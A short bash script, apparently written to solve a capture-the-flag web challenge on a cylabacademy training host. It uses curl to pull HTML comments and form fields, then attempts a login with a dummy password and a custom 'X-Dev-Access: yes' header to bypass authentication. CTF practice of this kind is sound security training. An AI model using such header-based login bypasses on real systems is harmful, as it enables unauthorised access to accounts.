#!/bin/bash
B="http://chatelaine.cylabacademy.net:40158"
echo "=== source : commentaire ROT13 ==="
curl -s -m 20 "$B/" | grep -oE "<!--[^>]*-->" | head -5
echo
echo "=== formulaire ==="
curl -s -m 20 "$B/" | grep -iE "<form|input|button" | head -10
echo
echo "=== login avec le header ==="
curl -s -m 20 -i -H "X-Dev-Access: yes" \
  --data-urlencode "email=ctf-player@cylabacademy.org" --data-urlencode "password=x" "$B/" | head -40
